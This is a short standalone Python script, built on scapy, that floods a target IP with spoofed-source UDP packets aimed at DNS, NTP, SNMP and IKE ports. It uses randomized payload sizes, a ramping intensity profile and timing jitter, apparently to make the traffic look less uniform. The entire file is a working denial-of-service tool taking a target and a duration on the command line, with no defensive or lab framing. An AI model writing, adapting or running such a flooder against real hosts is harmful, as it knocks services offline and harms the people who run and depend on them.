#!/usr/bin/env python3
import scapy.all as scapy
import random
import time
import sys

def attack_profile(duration):
    start = time.time()
    while True:
        elapsed = time.time() - start
        if elapsed > duration:
            break
        phase = elapsed / duration
        if phase < 0.3:
            intensity = 0.3
        elif phase < 0.7:
            intensity = 1.0
        else:
            intensity = 0.4
        yield intensity


def gaussian_payload():
    size = int(random.gauss(700, 300))
    size = max(64, min(size, 1500))
    return scapy.Raw(load=bytes(random.getrandbits(8) for _ in range(size)))


def random_clustered_ip():
    return f"{random.randint(1,223)}.{random.randint(0,30)}.{random.randint(0,255)}.{random.randint(1,254)}"


def udp_flood(target_ip, duration):

    base_rate = 100
    peak_rate = 1500

    for intensity in attack_profile(duration):

        current_rate = base_rate + (peak_rate - base_rate) * intensity

        pkt = (
            scapy.IP(src=random_clustered_ip(), dst=target_ip) /
            scapy.UDP(
                sport=random.randint(1024, 65535),
                dport=random.choice([53, 123, 161, 500])
            ) /
            gaussian_payload()
        )

        scapy.send(pkt, verbose=0)

        sleep_time = max(0.0003, 1.0 / current_rate)
        sleep_time *= random.uniform(0.6, 1.4)
        time.sleep(sleep_time)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: udp_flood.py <target_ip> <duration>")
        sys.exit(1)

    udp_flood(sys.argv[1], int(sys.argv[2]))